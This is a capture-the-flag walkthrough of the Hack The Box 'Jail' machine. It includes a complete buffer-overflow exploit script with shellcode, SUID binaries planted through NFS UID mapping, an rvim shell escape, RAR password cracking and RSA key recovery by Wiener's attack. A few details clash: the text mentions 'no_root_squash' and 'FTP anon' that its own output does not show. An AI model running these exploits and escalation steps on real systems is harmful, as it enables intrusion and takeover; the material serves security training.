---
icon: handcuffs
cover: ../../../../.gitbook/assets/Screenshot 2026-03-02 155639.png
coverY: -4.323740335369223
---

# HTB-JAIL

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ rustscan -a 10.10.10.34 blah blah
```

```
Open 10.10.10.34:22
Open 10.10.10.34:80
Open 10.10.10.34:111
Open 10.10.10.34:2049
Open 10.10.10.34:7411
Open 10.10.10.34:20048

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
111/tcp   open  rpcbind    2-4 (RPC #100000)
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
| fingerprint-strings:
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)
```

Six ports. SSH and HTTP are expected. Ports 111, 2049, and 20048 together form the NFS stack — rpcbind is required for NFSv2/v3, mountd handles the mount protocol, and 2049 is the NFS service itself. Port 7411 is interesting — it responds with "OK Ready. Send USER command." which strongly suggests a custom authentication service. Based on the Apache version, the host is likely CentOS 7.4.

#### Web Enumeration — TCP 80

The site is just ASCII art of a jail cell. Directory brute force with the standard `raft-medium-directories` wordlist finds nothing. Switching to the older `directory-list-2.3-medium.txt` (which was the standard for older HTB boxes) finds a hidden path:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ feroxbuster -u http://10.10.10.34 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```
301  GET  http://10.10.10.34/jailuser => http://10.10.10.34/jailuser/
```

`/jailuser` has directory listing enabled. Inside there's a `dev` subdirectory containing three files:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ wget -r http://10.10.10.34/jailuser/dev/
```

Three files download: `jail` (ELF binary), `jail.c` (source), and `compile.sh`.

#### NFS Enumeration — TCP 2049

Enumerating available shares:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ showmount -e 10.10.10.34
Export list for 10.10.10.34:
/opt          *
/var/nfsshare *
```

Both shares are exported to everyone (`*`). Mounting both:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ sudo mount -t nfs 10.10.10.34:/opt /mnt/opt/
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ sudo mkdir /mnt/nfsshare && sudo mount -t nfs 10.10.10.34:/var/nfsshare /mnt/nfsshare/
```

`/opt` contains a single script at `/mnt/opt/logreader/logreader.sh`:

```bash
#!/bin/bash
/bin/cat /home/frank/logs/checkproc.log
```

The permissions on the logreader directory look like they should deny access to non-root, non-frank users — but we can actually read it. This will make sense later: NFS maps our local user ID (1000) to the same UID on the remote system, which happens to be `frank`. The ACL on the directory grants `frank` read access, so we get it too without realizing it yet.

`/var/nfsshare` is group-writable:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ ls -ld /mnt/nfsshare/
drwx-wx--x 2 root sn0x 18 May 16 21:29 /mnt/nfsshare/
```

The group shows as our local user's GID 1000. On the remote system, GID 1000 is `frank`. We can write here but not read — this is the NFS privilege escalation vector we'll abuse later.

#### TCP 7411 — Custom Jail Service

Poking at the service:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ nc 10.10.10.34 7411
OK Ready. Send USER command.
USER test
OK Send PASS command.
PASS test
ERR Authentication failed.
```

Standard username/password authentication flow. We don't have credentials yet — source review will reveal them.

***

### Binary Reversing — jail.c

#### Source Overview

`compile.sh` tells us exactly how the binary is compiled:

```bash
gcc -o jail jail.c -m32 -z execstack
service jail stop
cp jail /usr/local/bin/jail
service jail start
```

Two critical flags: `-m32` (32-bit binary) and `-z execstack` (the NX bit is disabled — the stack is executable). This means if we can overflow a buffer on the stack, we can place shellcode there and jump to it directly. No ROP needed.

#### Key Vulnerability — Buffer Overflow in `auth()`

The `handle()` function reads commands into a 1024-byte buffer, copies the username and password into 256-byte buffers (`username[256]`, `password[256]`), and passes them to `auth()`.

Inside `auth()`:

```c
int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);  // <-- overflow here
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    }
    ...
}
```

`userpass` is only 16 bytes. The password from `handle()` is up to 256 bytes. `strcpy` does no bounds checking. If we send a password longer than 16 bytes, we overflow `userpass` and can overwrite the return address of `auth()`.

Even better: when `debugmode == 1` (triggered by sending `DEBUG` before authenticating), the function prints the address of the `userpass` buffer. This is a direct address leak — we know exactly where our shellcode will land.

The credentials are also visible in plaintext: `username == "admin"` and `userpass == "1974jailbreak!"`.

***

### Shell as nobody — Stack-Based Buffer Overflow

#### Verifying the Address Leak

Sending `DEBUG` before authenticating enables debug output. Testing if the address is static across connections:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ for i in $(seq 1 5); do
    echo -e 'DEBUG\nUSER admin\nPASS 1974jailbreak!\n' | nc -w 1 10.10.10.34 7411 | grep Debug
done
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
Debug: userpass buffer @ 0xffffd610
```

Static address every time. Because the binary forks per connection and ASLR isn't defeating a fixed layout here, the stack is reliably at `0xffffd610`. Combined with `execstack`, we have everything we need: we know where the buffer is, we know the stack is executable, and we control enough bytes to place shellcode there.

#### Finding the Overflow Offset

Setting up local debugging with gdb-peda, forking configuration:

```
gdb-peda$ set follow-fork-mode child
gdb-peda$ set detach-on-fork off
```

Creating a cyclic pattern and sending it as the password:

```
gdb-peda$ pattern_create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
```

After the crash, EIP holds `0x413b4141`:

```
gdb-peda$ pattern_offset 0x413b4141
1094402369 found at offset: 28
```

The return address sits 28 bytes into the password buffer. Validating:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ python3 -c "print('A'*28 + 'BBBB')" | nc 127.0.0.1 7411
```

```
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

28 bytes of padding, then 4 bytes of return address control confirmed.

#### Exploit Strategy

The layout is:

* 28 bytes of `A` (padding to reach return address)
* 4 bytes pointing to `userpass_addr + 32` (skipping past the padding and address itself into our shellcode)
* shellcode (socket-reusing `dup2` + `execve(/bin/sh)`)

The `+32` offset skips the 28 padding bytes plus the 4-byte return address itself, landing execution at the start of the shellcode.

#### Full Exploit Script

```python
#!/usr/bin/env python3

from pwn import *

if args['REMOTE']:
    ip = '10.10.10.34'
else:
    ip = '127.0.0.1'

# Stage 1: Leak the userpass buffer address via DEBUG mode
p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"DEBUG")
p.recvuntil(b"OK DEBUG mode on.")
p.sendline(b"PASS admin")
p.recvuntil(b"Debug: userpass buffer @ ")
userpass_addr = int(p.recvline(), 16)
log.info(f"Leaked userpass address: 0x{userpass_addr:08x}")
p.close()

# Stage 2: Overflow with shellcode, return into userpass buffer
# Socket-reuse shellcode: dup2(sock, 0/1/2) + execve("/bin/sh")
# Source: https://www.exploit-db.com/exploits/34060
shellcode  = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80"

payload  = b"A" * 28                        # padding to return address
payload += p32(userpass_addr + 32)          # return into shellcode region
payload += shellcode

p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS " + payload)

p.interactive()
```

Running it:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ python3 exploit.py REMOTE
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Leaked userpass address: 0xffffd610
[*] Closed connection to 10.10.10.34 port 7411
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Switching to interactive mode
$ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
```

Shell as `nobody`. The context field confirms SELinux is active — important to keep in mind for later steps.

Upgrading to a proper PTY:

```
$ script /dev/null -c bash
bash-4.2$
```

***

### Privilege Escalation — nobody to frank

#### Enumeration

`sudo -l` as nobody:

```
bash-4.2$ sudo -l
User nobody may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
```

We can run `logreader.sh` as `frank` with no password. The script itself just reads a log file — not directly exploitable as-is. But it tells us frank's home directory structure is accessible through the script path.

#### NFS no\_root\_squash + SUID Binary

Checking `/etc/exports`:

```
bash-4.2$ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt          *(rw,sync,root_squash,no_all_squash)
```

`root_squash` — our local root maps to `nobody` on Jail. `no_all_squash` — every other user maps by UID directly. Our local user (UID 1000) maps to frank (UID 1000) on Jail. We can write to `/var/nfsshare` from our attacker machine and those files will appear owned by UID 1000 — which is `frank` on Jail.

Writing a SUID escalation binary from the attacker machine:

```c
// sn0x.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ gcc sn0x.c -o /mnt/nfsshare/sn0x
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ chmod 4777 /mnt/nfsshare/sn0x
```

Because `no_all_squash` maps our UID 1000 to frank's UID 1000, the binary on Jail is owned by `frank` and has the SUID bit set. Running it from the `nobody` shell:

```
bash-4.2$ /var/nfsshare/sn0x
[frank@localhost /]$ id
uid=1000(frank) gid=99(nobody) groups=99(nobody)
```

#### SSH as frank

Getting a stable shell by writing an SSH key:

```
[frank@localhost /]$ cd ~/.ssh
[frank@localhost .ssh]$ echo "ssh-ed25519 AAAA... sn0x@sn0x" >> authorized_keys
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ ssh -i ~/.ssh/sn0x_key frank@10.10.10.34
[frank@localhost ~]$ cat user.txt
d084f1b7...
```

***

### Privilege Escalation — frank to adm

#### sudo Enumeration

```
[frank@localhost ~]$ sudo -l
User frank may run the following commands on this host:
    (frank) NOPASSWD: /opt/logreader/logreader.sh
    (adm)   NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

frank can run `rvim` (restricted vim) as `adm` to view `jail.c`. Restricted vim blocks `:!command` shell escapes by design — but not all escape paths are closed.

#### rvim Escape via Python

GTFObins documents that rvim can be escaped using Python or Lua even in restricted mode. Opening the file:

```
[frank@localhost ~]$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Inside vim, entering command mode and running:

```
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

This replaces the current process with `/bin/sh` entirely — bypassing rvim's restrictions because it uses Python's `os.execl` rather than a shell escape:

```
sh-4.2$ id
uid=3(adm) gid=4(adm) groups=4(adm) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Alternatively: `:py import pty; pty.spawn("/bin/bash")` produces the same result.

***

### Privilege Escalation — adm to root

#### Enumeration as adm

Finding files owned by or accessible to the `adm` group:

```
bash-4.2$ find / -group adm 2>/dev/null | grep -v ^/proc
/var/adm
/var/adm/.keys
/var/adm/.keys/note.txt
/var/adm/.keys/.local
/var/adm/.keys/.local/.frank
/var/adm/.keys/keys.rar
/var/www/html/jailuser/dev/jail.c
```

Three interesting files in `/var/adm/.keys`:

**`note.txt`:**

```
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your
last name followed by a 4 digit number and a symbol.
```

Password policy defined: `LastName####!` format. This tells us exactly how to generate a wordlist.

**`keys.rar`:** An encrypted RAR archive containing `rootauthorizedsshkey.pub`.

**`.local/.frank`:** Obfuscated text:

```
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev
Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

#### Decoding the Cipher

This is the Atbash cipher — a simple substitution where A↔Z, B↔Y, C↔X. Decoding it:

```
Hahaha! Nobody will guess my new password! Only a few lucky souls have
Escaped from Alcatraz alive like I did!!!
```

The reference to Alcatraz escapees points to the famous 1962 escape. Three men escaped Alcatraz: John Anglin, Clarence Anglin, and **Frank Morris**. Since the user on this box is `frank`, the last name is `Morris`.

#### Generating the Wordlist

The password format from the note is `LastName + 4 digits + 1 symbol`, which means `Morris####?s`. Using hashcat's mask attack to generate all possibilities:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ hashcat --stdout -a 3 Morris?d?d?d?d?s > frank_passwords.txt
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ wc -l frank_passwords.txt
330000 frank_passwords.txt
```

#### Cracking the RAR Archive

Exfiltrating `keys.rar` via frank's SSH:

```
bash-4.2$ cp /var/adm/.keys/keys.rar /tmp/ && chmod 666 /tmp/keys.rar
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ scp -i ~/.ssh/sn0x_key frank@10.10.10.34:/tmp/keys.rar .
```

Extracting the hash with `rar2john`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ rar2john keys.rar > keys.rar.hash
```

The hash format hashcat expects for RAR3 (mode 23800) needs the trailing `:1::filename` stripped. After trimming:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ hashcat -m 23800 keys.rar.hash frank_passwords.txt --user
```

```
$RAR3$*1*723eaa0f90898667*eeb44b5b*...*33:Morris1962!
```

Password cracked: `Morris1962!` — 1962 being the year Frank Morris escaped Alcatraz, `!` being the symbol.

#### Extracting the RSA Public Key

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ unrar e keys.rar
Enter password: Morris1962!

Extracting rootauthorizedsshkey.pub  OK
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ cat rootauthorizedsshkey.pub
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
...
-----END PUBLIC KEY-----
```

#### Factoring the Weak RSA Key

A public key for SSH authentication means root's private key was generated with this public key. If the key was generated with weak parameters, we can factor the modulus to derive the private key.

Using RsaCtfTool against the public key:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ python3 /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
[*] Testing key rootauthorizedsshkey.pub.
[*] Performing factordb attack on rootauthorizedsshkey.pub.
[*] Performing wiener attack on rootauthorizedsshkey.pub.
[*] Attack success with wiener method!

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRV...
-----END RSA PRIVATE KEY-----
```

The Wiener attack succeeded. Wiener's attack works when the RSA private exponent `d` is too small relative to the modulus `N` — a parameter generation flaw that makes the key mathematically breakable without brute force.

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ vim ~/.ssh/jail_root && chmod 600 ~/.ssh/jail_root
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ ssh -i ~/.ssh/jail_root root@10.10.10.34
[root@localhost ~]# cat root.txt
7c541d7e...
```

***

### Bonus — NFS ACL Explanation and Alternative adm Escalation

#### Why We Could Read logreader.sh

The `/opt/logreader` directory shows `drwxr-x---` permissions owned by `root:root` on the NFS mount — meaning no non-root user should access it. But we can, because the box uses POSIX ACLs (visible as `+` in `ls -l` output on the box itself):

```
[root@localhost opt]# getfacl logreader/
user::rwx
user:frank:r-x
group::r-x
mask::r-x
other::---
```

Frank has explicit read+execute ACL on the directory. Since NFS's `no_all_squash` maps our UID 1000 to frank's UID 1000, we get frank's ACL permissions transparently — even though we can't see the ACL from our side of the mount.

Root gets squashed to `nobody` by `root_squash`, which is why even `sudo` on the attacker machine can't access the directory.

#### Alternative frank → adm via NFS (Without rvim)

The same NFS UID-mapping technique that got us to frank can get us to adm, with extra steps. adm is UID 3 on Jail. On the attacker machine, `sys` is UID 3. Temporarily modifying `/etc/passwd` to give `sys` a shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Jail]
└─$ sudo su sys -s /bin/bash
```

Creating a world-writable directory in the NFS share as frank (UID 1000), then writing an adm-owned SUID+SGID binary as sys (UID 3, which maps to adm on Jail):

```c
// adm.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(3, 3, 3);
    setresgid(4, 4, 4);  // adm group on Jail
    system("/bin/bash");
    return 0;
}
```

```
sys@attacker$ gcc adm.c -o /mnt/nfsshare/subdir/adm
sys@attacker$ chmod 6777 /mnt/nfsshare/subdir/adm
```

The `6` in `chmod 6777` sets both SUID (4) and SGID (2). Running from frank's shell gives adm's UID and GID, making `/var/adm` accessible to proceed with the RAR cracking path directly.

***

### Attack Flow

```
[FTP anon / Web — /jailuser/dev/]
        |
        v
jail.c source code retrieved
  --> compile.sh: -m32 -z execstack (32-bit, NX disabled)
  --> auth(): strcpy(userpass[16], password[256]) -- stack overflow
  --> DEBUG mode: leaks userpass buffer address
        |
        v
Two-stage exploit:
  Stage 1: Send DEBUG + valid creds --> leak 0xffffd610
  Stage 2: 28-byte padding + p32(userpass_addr+32) + socket-reuse shellcode
        |
        v
[Shell as nobody]
        |
        v
sudo -l: nobody can run /opt/logreader/logreader.sh as frank
NFS no_all_squash: attacker UID 1000 == frank UID 1000 on Jail
  --> compile SUID binary on attacker, write to /var/nfsshare
  --> chmod 4777 sets SUID owned by frank
  --> run /var/nfsshare/sn0x from nobody shell
        |
        v
[Shell as frank + SSH key written]
        |
        v
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
  --> rvim escape: :py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
        |
        v
[Shell as adm]
        |
        v
/var/adm/.keys/ discovered:
  - note.txt: password policy = LastName + 4 digits + symbol
  - .local/.frank: Atbash cipher --> "Escaped from Alcatraz" --> Frank Morris
  - keys.rar: encrypted, contains rootauthorizedsshkey.pub

hashcat mask: Morris?d?d?d?d?s --> 330,000 candidates
rar2john + hashcat mode 23800 --> Morris1962!
unrar e keys.rar --> rootauthorizedsshkey.pub extracted
        |
        v
RsaCtfTool --publickey rootauthorizedsshkey.pub --private
  --> Wiener's attack succeeds (small private exponent d)
  --> RSA private key recovered
        |
        v
ssh -i jail_root root@10.10.10.34
        |
        v
[root shell] --> root.txt
```

***

### Techniques

| Technique                                                             | Where Used                                                                           |
| --------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Feroxbuster with alternate wordlist (`directory-list-2.3-medium.txt`) | Finding `/jailuser/dev/` — missed by modern wordlists                                |
| NFS share enumeration (`showmount -e`)                                | Discovering `/opt` and `/var/nfsshare` exports                                       |
| Source code review (C)                                                | Identifying `strcpy` stack overflow and DEBUG address leak in `auth()`               |
| `-z execstack` exploitation                                           | Stack shellcode execution possible due to disabled NX                                |
| DEBUG mode address leak                                               | Defeating ASLR by leaking the `userpass` buffer address from the service itself      |
| 32-bit stack buffer overflow                                          | 28-byte offset to RIP, return-to-buffer with socket-reuse shellcode                  |
| gdb-peda pattern create/offset                                        | Finding exact overflow offset in local debugging session                             |
| NFS UID mapping (`no_all_squash`)                                     | Attacker UID 1000 maps to frank (UID 1000) on target — write SUID binary             |
| SUID C binary via NFS                                                 | Escalating from nobody to frank by writing `setresuid(1000,1000,1000)` SUID binary   |
| `sudo -l` enumeration                                                 | Discovering frank can run `rvim` as adm                                              |
| rvim escape via Python (`os.execl`)                                   | Bypassing restricted vim's shell block using Python's process replacement            |
| Atbash cipher decoding                                                | Decoding `.frank` file to reveal Frank Morris Alcatraz reference                     |
| hashcat mask attack (`?d?d?d?d?s`)                                    | Generating 330,000 password candidates matching the documented policy                |
| `rar2john` + hashcat mode 23800                                       | Cracking the encrypted RAR archive password                                          |
| Wiener's attack (RsaCtfTool)                                          | Factoring weak RSA public key due to small private exponent — recovering private key |
| POSIX ACL via NFS                                                     | Understanding why UID 1000 could read `logreader/` despite `drwxr-x---` permissions  |
| SUID+SGID NFS binary (alternative path)                               | Alternate frank→adm escalation: mapping UID 3 locally to adm (UID 3) on Jail         |

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
